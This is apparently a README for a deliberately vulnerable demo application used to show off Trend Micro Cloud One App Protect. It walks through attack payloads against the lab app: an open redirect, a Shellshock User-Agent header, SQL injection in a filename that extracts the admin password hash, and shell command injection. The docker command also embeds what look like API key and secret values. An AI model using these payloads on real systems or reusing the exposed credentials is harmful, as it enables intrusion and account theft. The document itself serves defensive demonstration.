# Cloud One App Protect Demo
## Requirements
Computer running docker;
Cloud One App Protect Account

## Instructions to Deploy the Vulnerable Application (It can be deployed on AWS ECS as well)
In the computer where you are running Docker;

docker run --rm -d -p 80:8000 --name demo-cloudone-appprotect -e TREND_AP_KEY=2ce66f11-5028-4a50-8b8f-5b59a3ae82f7 -e TREND_AP_SECRET=fe6f14ad-72ce-4cf5-8373-a8a6322d09ac andrefernandes86/demo-cloudone-appprotect:latest

## Testing the Vulnerable Application
http://target-ip/

## Checking the Cloud One Management Console (Policies and Logs)
https://cloudone.trendmicro.com

## Attacking the Vulnerable Application
##### Open Redirect Vulnerability
###### http://target-ip/taskManager/logout?redirect=http://www.cnn.com 

##### Malicious Payload (Intrusion Prevention)
###### curl -H "User-Agent: () { :; }; /bin/eject" http://target-ip 

##### Remote Command Execution
###### 1. Go to http://127.0.0.1:8000/ and click "Login"
###### 2. Login to the application
###### user / user123
###### 3. Click the link for the "demo project".
###### 4. Click the "Add files" link.
###### 5. Pick any file from your local computer, and use the following payload for the filename:
###### '||(SELECT password FROM auth_user WHERE username='admin')||'

Once this exploit has succeeded, you should see the file in the project file list. The filename contains the MD5 hash of the password of the admin user (after the "md5$"). You should be able to crack this password using JTR or rainbow tables or other.

https://md5decrypt.net/en/

##### OS Command Injection:
###### In the same place as in for the attack above ("My Projects" --> project you created, add files). Also pick any file from your local computer, but for the payload use:
###### An innocent sleep statement (to demonstrate that we can run any command):
###### some_file_name; sleep 1m

You'll notice that (without Cloud One Application Security), the browser will "sleep" for 1 minute.
.
